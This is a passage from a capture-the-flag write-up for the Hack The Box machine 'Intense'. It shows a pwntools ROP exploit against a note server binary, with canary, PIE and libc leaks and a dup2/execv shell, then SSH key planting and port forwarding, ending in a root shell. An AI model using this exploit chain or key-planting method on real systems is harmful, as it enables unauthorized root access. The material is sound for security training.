──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555542c → handle_client(sock=0x4)
[#1] 0x555555555674 → main(argc=0x1, argv=0x7fffffffe138)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```


>If it works for you, you'll see a lot of A in the stack.

We already know that the canary places 8 byts at the top of the stack and that we fill the buffer with 1024
let's do telescope to know offset to used in calculate the `stack` and `PIE` base address frome leak. 
```shell

gef➤  tel note+1024-0x8
0x00007fffffffdf28│+0x0000: 0x4141414141414141
0x00007fffffffdf30│+0x0008: 0x00007fffffffe040  →  0x0000555555555690  →  <__libc_csu_init+0> push r15
0x00007fffffffdf38│+0x0010: 0xe5c621c0890f8900
0x00007fffffffdf40│+0x0018: 0x00007fffffffe040  →  0x0000555555555690  →  <__libc_csu_init+0> push r15   ← $rbp
0x00007fffffffdf48│+0x0020: 0x0000555555555674  →  <main+524> mov edi, 0x0
0x00007fffffffdf50│+0x0028: 0x00007fffffffe138  →  0x00007fffffffe44c  →  "/home/ezi0x00/HTB/Intense/note_local"
0x00007fffffffdf58│+0x0030: 0x0000000100000380
0x00007fffffffdf60│+0x0038: 0x0000038000000380
0x00007fffffffdf68│+0x0040: 0x0000001000000380
0x00007fffffffdf70│+0x0048: 0x0000138900000003
gef➤   
```
As we can see the note fault at `0x00007fffffffdf28`, and next address `0x00007fffffffe040` is rbp a `stack canary`. 
Then we see the stack `canary` as a `PIE` address `0x0000555555555674`, and as we can notice this a base address from main so that's mean  `handle_client` will return, so that is address we want.
and this `0x00007fffffffe138` location of base(return).

se to know `offset` 
```shell
gef➤  p/x 0x0000555555555674-$_base()
$1 = 0x1674
gef➤  
```
let's finish it, but in the first we explain some things
>I forgot to explain what kind of exploitation here. This is called ROP Exploitation, is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing. 
>
>In this technique, an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine's memory, called "gadgets". 

Now, after we found return address in local compiled, let's finish the exploit code, then change from local to box 

```
log.info("Stage One - Bypass ASLR")
write("A"* 200)
write("A"* 200)
write("A"* 200)
write("A"* 200)
write("A"* 224)
copy(1024,255)
read()
p.recv(1024)
p.recv(8)
canary = u64(p.recv(8))
log.success(f"Canary: {hex(canary)}")
```
fill up the stack to bypass `ASLR`

```
rbp = u64(p.recv(8))
ret = u64(p.recv(8))
base = u64(p.recv(8))
log.success(f"Return: {hex(ret)}")

e.address = ret - 0x1674 #PIE base(return address)

log.info("Stage two - Find libc")
p = remote("127.0.0.1", 5001)
rop = ROP(e)
rop.call(e.plt['write'], [4, e.got['read']])
exploit(canary,rop)

read_leak = u64(p.recv(8))
libc.address = read_leak - libc.sym['read']
``` 
this process is going to return to main and exit.
>you should do it by hand cause offset based on your compiler.


The ROP chain is sent in at the top of the note buffer, then fill up the note buffer to 1024 as before.

```
p = remote("127.0.0.1", 5001)

rop = ROP(e)
rop.call(e.plt['write'], [4, e.got['read']])

exploit(canary,rop)

read_leak = u64(p.recv(8))
log.success(f"Libc leak : {hex(leak)}")
libc.address = leak - libc.sym['read'] 
```
We create a ROP chain to call the `write()`, with the first argument (file descriptor) set to 4. This will remain constant for a given forked process.
Next, the second argument (buffer) is set to the `GOT` address of the `read()`, and `libc.address = leak - libc.sym['read']` to calculate libc base.

```shell
ef➤  b 82
Breakpoint 2 at 0x55555555542c: file note_server.c, line 82.
gef➤  c
Continuing.
[Attaching after process 8182 fork to child process 8275]
[New inferior 2 (process 8275)]
[Detaching after fork from parent process 8182]
[Inferior 1 (process 8182) detached]
[Switching to process 8275]

Thread 2.1 "note_local" hit Breakpoint 2, handle_client (sock=0x4) at note_server.c:82
82                      write(sock, note, index);
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x3               
$rbx   : 0x0               
$rcx   : 0x00007ffff7edddee  →  0x5a77fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x00007fffffffdb10  →  0x0000000000000003
$rbp   : 0x00007fffffffdf40  →  0x00007fffffffe040  →  0x0000555555555690  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffdb29  →  0x4104ff0400ffe003
$rdi   : 0x4               
$rip   : 0x000055555555542c  →  <handle_client+519> movzx edx, WORD PTR [rbp-0x412]
$r8    : 0x0               
$r9    : 0x00007ffff7fb5540  →  0x00007ffff7fb5540  →  [loop detected]
$r10   : 0x00007ffff7fb5810  →  0x0000000000002053 ("S "?)
$r11   : 0x246             
$r12   : 0x0000555555555140  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
```
here `$rdi   : 0x4` this is file descriptor.
```
log.info("Stage Three - pwn")
p = remote("127.0.0.1", 5001)
rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh\x00"))
rop.dup2(4,0)
rop.dup2(4,1)
rop.dup2(4,2)
rop.execv(binsh,0) 
exploit(canary,rop)

p.interactive()
```
The snippet above generates a new ROP chain, which duplicates stdin and stdout to fd 4. Next, execv(""/bin/sh", NULL) is called to spawn a shell

Now we have prepared everything to access the `root`, we just need to reverse that process instead of the local machine, but rather make it on the victim box
First, we need to do an `ssh` tunnel for Doing a Local Port Forward with the `Debian-SNMP` use

we will generate our key. And if you remember when we got `LFI` and saw `passwd`, we noticed that there is `/var/lib/snmp:/bin/false`, there you will find the `auth key` for the `ssh`.
```shell
Debian-snmp@intense:/var/lib/snmp$ ls -lah
total 36K
drwxr-xr-x  8 Debian-snmp Debian-snmp 4.0K Nov 18 23:12 .
drwxr-xr-x 38 root        root        4.0K Nov 16  2019 ..
drwx------  2 Debian-snmp Debian-snmp 4.0K Nov 16  2019 .cache
drwx------  3 Debian-snmp Debian-snmp 4.0K Nov 16  2019 .gnupg
drwxr-xr-x  3 Debian-snmp Debian-snmp 4.0K Nov 18 23:12 .local
drwx------  2 root        root        4.0K Nov 16  2019 mib_indexes
drwxr-xr-x  4 Debian-snmp Debian-snmp 4.0K Nov 16  2019 mibs
-rw-------  1 Debian-snmp Debian-snmp 1.1K Nov 18 06:08 snmpd.conf
-rwx------  1 root        root           0 Jul  9 08:24 snmp.local.conf
drwxr-xr-x  2 Debian-snmp Debian-snmp 4.0K Jun 30 09:00 .ssh
Debian-snmp@intense:/var/lib/snmp$ cd .ssh

Debian-snmp@intense:/var/lib/snmp/.ssh$ ls -lah
total 12K
drwxr-xr-x 2 Debian-snmp Debian-snmp 4.0K Jun 30 09:00 .
drwxr-xr-x 8 Debian-snmp Debian-snmp 4.0K Nov 18 23:12 ..
-rw-r--r-- 1 Debian-snmp Debian-snmp  395 Jun 30 09:34 authorized_keys
```
We can generate `SSH` keys to forward the port.
```
ezi0x00@kali:~/HTB/Intense$ ssh-keygen -f intense
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in intense
Your public key has been saved in intense.pub
The key fingerprint is:
SHA256:3o6rs3B23pLBKTi0TvIEaQEBHqD6NMphLrPFZ+IWyfE ezi0x00@kali
The key's randomart image is:
+---[RSA 3072]----+
|B+               |
|o o              |
|.. o             |
|. = .            |
|.=o* o .S.       |
|+=*.E ..+.       |
|+o=B+.o.oo.      |
|.=.+o+.oo+       |
|...   o++oo      |
+----[SHA256]-----+
ezi0x00@kali:~/HTB/Intense$ ls -lah | grep pub
-rw-r--r--  1 ezi0x00 ezi0x00  566 Nov 19 01:26 intense.pub
ezi0x00@kali:~/HTB/Intense$ cat intense.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3qTAJUS5VASYHFghtp8jUCzFjE6IE2eEDy76tIYcT+8LHBBc5XG91J2SuPf70IZ3InOye7Ulft7BXCSicysFxObcfcogvZthireCYfSVKnDtRY1Eokto07uiw6DrKryTs9pjvi7NjHIrg132FSByv61qnCHKCxZnAf9a19/opN9XqiaLiiriLRY6RurBC5ZM1Hmig74uaeewj5D/yy2WnU+SZrvhMF11dQ9QCPmpKGgGe0w0xy8ww275d1Wi0Tc78rOZdYZU2dzOF7zDCS/ZLYJB+KJUmd8gUakCn7iFplbxIPvGBetbmySYfSgyhlWJE68d8SgXZxH/Rv7GDX9AGUvflPBVAWRBZoGI+AHxHaCRr7OknhHMfOfJJN7fnqVaGXfuRwYzInRv/f2o92jRRwXdG3sw5vYIvVFMAOAmyeKL/PaUSP4IrsxW5h9QYYg6HdZUDqHIz9aWyYoICQFle6qZIQgiBggRG+ubTu4nYue3rhGVQUpOQRbDYpsPpxOc= ezi0x00@kali
```
[**In short, if you try to put your key in the auth file, it will be rejected because it only accepts from 0: 255 and your key is larger than that. So we will use a different algorithm called `ecdsa`.**]

```shell
zi0x00@kali:~/HTB/Intense$ ssh-keygen -t ecdsa -f intense
Generating public/private ecdsa key pair.
intense already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in intense
Your public key has been saved in intense.pub
The key fingerprint is:
SHA256:h0aUj3wr5FedTVG8g+9QXSzl7ZQ7kBjhDBSwx0YKBRE ezi0x00@kali
The key's randomart image is:
+---[ECDSA 256]---+
|     E=o+*.o.  ==|
|      ..* + o o.B|
|       +.* + +.*B|
|       .*.o ..+*+|
|       oS..o  ooo|
|       .o.o  . ..|
|         o    o  |
|               . |
|                 |
+----[SHA256]-----+
ezi0x00@kali:~/HTB/Intense$ cat intense.pub
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcDsIVnGpMgqEwcHVp6vGgfU6E8OccBv1ei+Iz5Qm1ZNAuHq+Q7+qccqCMG4PMj65KCxKIxUHS+nEZ6NPycj0Y= ezi0x00@kali
```
So the steps
```shell
Debian-snmp@intense:/var/lib/snmp/.ssh$ echo -n "ecdsa-sha2-nistp256" > x

Debian-snmp@intense:/var/lib/snmp/.ssh$ cat x

ecdsa-sha2-nistp256Debian-snmp@intense:/var/lib/snmp/.ssh$ echo -n ' AAAAE2VjZHNhLXNoYTItbml' >> x

Debian-snmp@intense:/var/lib/snmp/.ssh$ echo -n 'zdHAyNTYAAAAIbmlzdHAyNTYAAABB' >> x

Debian-snmp@intense:/var/lib/snmp/.ssh$ echo -n 'BNcDsIVnGpMgqEwcHVp6vGgfU6E8OccBv1ei' >> x

Debian-snmp@intense:/var/lib/snmp/.ssh$ echo -n '+Iz5Qm1ZNAuHq+Q7+qccqCMG4PMj65KCxKIx' >> x

Debian-snmp@intense:/var/lib/snmp/.ssh$ echo -n 'UHS+nEZ6NPycj0Y= ' >> x

Debian-snmp@intense:/var/lib/snmp/.ssh$ cat x

ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcDsIVnGpMgqEwcHVp6vGgfU6E8OccBv1ei+Iz5Qm1ZNAuHq+Q7+qccqCMG4PMj65KCxKIxUHS+nEZ6NPycj0Y=Debian-snmp@intense:/var/lib/snmp/.ssh$
Debian-snmp@intense:/var/lib/snmp/.ssh$ cat x >> authorized_keys
Debian-snmp@intense:/var/lib/snmp/.ssh$
 ```
 ```shell
ezi0x00@kali:~/HTB/Intense$ chmod 600 intense
ezi0x00@kali:~/HTB/Intense$ ssh -i intense Debian-snmp@10.10.10.195
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Nov 19 00:34:46 UTC 2020

  System load:  0.0               Processes:             172
  Usage of /:   6.3% of 39.12GB   Users logged in:       0
  Memory usage: 9%                IP address for ens160: 10.10.10.195
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

181 packages can be updated.
130 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Nov 19 00:25:59 2020 from 10.10.16.11
Connection to 10.10.10.195 closed.
```
connection is closed because the shell for Debian-snmp is set to `/bin/false`:
```shell
Debian-snmp@intense:/var/lib/snmp/.ssh$ grep snmp /etc/passwd
Debian-snmp:x:111:113::/var/lib/snmp:/bin/false
```
so to get a shell
```shell
ezi0x00@kali:~/HTB/Intense$ ssh -i intense -N -L5001:localhost:5001 Debian-snmp@10.10.10.195
```
let's do some exploitation, Through this [**Shellcode**](https://github.com/0xN1ghtR1ngs/CTF-Scripts/blob/main/IntenseMachine-HTB/exploit_note.py) after it has reached its final form.
first change from local to server.
```
#!/usr/bin/env python3

from pwn import *

context.binary = './note_server'
e = context.binary
libc = ELF('./libc')
r = remote("127.0.0.1", 5001)
```
because its server need a `libc` file `Server-specific`, not local.
```shell
Debian-snmp@intense:/home/user$ ldd note_server
        linux-vdso.so.1 (0x00007ffc7a3e4000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4dde41e000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f4ddea12000)
```
then download executable file and `Libc` file by: 
```shell
Debian-snmp@intense:/home/user$ base64 note_server > /tmp/note.b64
Debian-snmp@intense:/lib/x86_64-linux-gnu$ base64 /lib/x86_64-linux-gnu/libc.so.6 > /tmp/libc.b64
```
![website](/assets/img/Posts/downexe.png)
do it again with `libc.b64` and copy `base64` in file `note_server.b64`, `lib.b64`.
then: 
```shell
ezi0x00@kali:~/HTB/Intense$ base64 -di libc.b64 > libc
ezi0x00@kali:~/HTB/Intense$ base64 -di note_server.b64 > note_server
```
Now we want the new `PIE` base(return address) server specific to do that after got a `note_server` debug it not local was compiled on local.
We don't need to repeat the previous steps to get the return address, just look at the main function
```shell
ezi0x00@kali:~/HTB/Intense$ gdb note_server -ex 'disassemble main'
......snip......
   0x0000000000000f4f <+517>:   call   0xb0a <handle_client>
   0x0000000000000f54 <+522>:   mov    edi,0x0
   0x0000000000000f59 <+527>:   call   0x9c0 <exit@plt>
   0x0000000000000f5e <+532>:   mov    eax,DWORD PTR [rbp-0xc8]
   0x0000000000000f64 <+538>:   mov    edi,eax
   0x0000000000000f66 <+540>:   call   0x930 <close@plt>
   0x0000000000000f6b <+545>:   jmp    0xec4 <main+378>
End of assembler dump.
gef➤  
```
The return address is at an offset of `0xf54` from the base
just you can see `vmmap` and do it: 

`start offset - libc find`

```shell
ezi0x00@kali:~/HTB/Intense$ python 
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> print(hex(0x0000555555554000-0x555555554f54))
-0xf54
>>> 
```
find libc we did it in exploit code 
```
rbp = u64(p.recv(8))
ret = u64(p.recv(8))
base = u64(p.recv(8))
log.success(f"Return: {hex(ret)}")
```
Now change `0x1674` to `0xf54` 
```
e.address = ret - 0xf54
```
The decisive moment has come
```shell
ezi0x00@kali:~/HTB/Intense$ python3 exploit.py 
[*] '/home/ezi0x00/HTB/Intense/note_server'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/ezi0x00/HTB/Intense/libc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 127.0.0.1 on port 5001: Done
[*] Stage One - Defeat ASLR
[+] Canary: 0xc4c8d3e9f9b6d400
[+] Return: 0x55e7e9d21f54
[*] Stage two - Find libc
[+] Opening connection to 127.0.0.1 on port 5001: Done
[*] Loaded 14 cached gadgets for './note_server'
[*] Stage Three - pwn
[+] Opening connection to 127.0.0.1 on port 5001: Done
[*] Loaded 198 cached gadgets for './libc'
[*] Switching to interactive mode
$ id 
uid=0(root) gid=0(root) groups=0(root)
$ cd /root
$ ls
root.txt
script.sh
$ cat root.txt
d518c7fdb516b4ef****************
$  
```

And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !
